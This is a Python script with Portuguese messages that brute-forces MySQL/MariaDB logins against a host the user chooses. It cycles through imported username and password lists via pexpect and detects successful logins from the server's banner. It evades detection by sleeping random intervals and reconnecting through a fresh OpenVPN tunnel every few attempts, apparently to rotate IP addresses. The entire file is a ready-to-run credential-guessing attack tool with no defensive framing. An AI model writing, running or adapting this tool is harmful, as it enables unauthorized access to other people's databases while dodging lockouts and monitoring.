import pexpect
import random
import passwords
import time
import vpn
import users

passwordsl = passwords.passwords_
usersl = users.users_
openvpn_enter = vpn.openvpn_enter_()

finded = False

LOGIN_SUCCESS_MARIADB = 0
LOGIN_SUCCESS_MYSQL = 1
ERROR_1698 = 2
LOGIN_DENIED = 3
END = 4
TIMEOUT = 5


def expect_state(process, patterns):
    try:
        return process.expect(patterns)
    except pexpect.EOF:
        return END
    except pexpect.TIMEOUT:
        return TIMEOUT


i = int(input("Qual o valor inicial do usuário: "))
j = int(input("Qual o valor inicial da senha: "))

destino = input("Qual o destino: ")

next_ = random.randint(30, 45)
next5 = 5

tries_exceeded = 0

while i < len(usersl):

    with open("/tmp/status", "r") as f:
        lines = f.readlines()

    lines[1] = f"{i}\n"

    with open("/tmp/status", "w") as f:
        f.writelines(lines)

    while j < len(passwordsl):

        with open("/tmp/status", "r") as f:
            lines = f.readlines()
    
        lines[2] = f"{j}\n"

        with open("/tmp/status", "w") as f:
            f.writelines(lines)

        process = pexpect.spawn("mysql", ["-u", usersl[i], "-p", destino], encoding="utf-8", timeout=10)

        result = expect_state(process, ["Enter password:"])

        if result == 0:
            try:
                process.sendline(str(passwordsl[j]))
            except pexpect.EOF:
                result = END
            except pexpect.TIMEOUT:
                result = TIMEOUT

        if result == 0:
            result = expect_state(process, [
                r"Welcome to the MariaDB monitor",
                r"Welcome to the MySQL monitor",
                r"ERROR 1698 .*Access denied for user",
                r"ERROR 1045 .*Access denied for user",
                pexpect.EOF,
                pexpect.TIMEOUT,
            ])

        if result in (LOGIN_SUCCESS_MARIADB, LOGIN_SUCCESS_MYSQL):
            password = passwordsl[j]
            print(password)
            process.close()

            finded = True

            with open("/tmp/status", "r") as f:
                lines = f.readlines()
            
            lines[3] = "True\n"

            with open("/tmp/status", "w") as f:
                f.writelines(lines)

            break

        if result in (ERROR_1698, LOGIN_DENIED):
            print("Senha recusada pelo MySQL.")
        elif result == END:
            print("A conexão com o MySQL foi encerrada.")
        elif result == TIMEOUT:
            print("Tempo limite aguardando a resposta do MySQL.")

        if j == next_:
            time.sleep(random.randint(15, 20))
            next_ += random.randint(35, 55)

        delay = random.randint(1, 3)
        time.sleep(delay)

        if result in (END, TIMEOUT):
            tries_exceeded += 1

            if tries_exceeded >= 15:
                with open("/tmp/status", "r") as f:
                    lines = f.readlines()
                
                lines[4] = "Muitas tentativas falhadas. Arquivo encerrado\n"

                with open("/tmp/status", "w") as f:
                    f.writelines(lines)

                print("Muitas tentativas falhadas. Encerrando...")
                process.close()
                break

            process.close()
            continue

        tries_exceeded = 0
        process.close()
        
        if j >= next5:
            openvpn_enter.close()
            openvpn_enter = vpn.openvpn_enter_()
            next5 += 5

        j += 1

    if tries_exceeded >= 15:
        break

    if finded == True:
        break

    i += 1
    j = 0

openvpn_enter.close()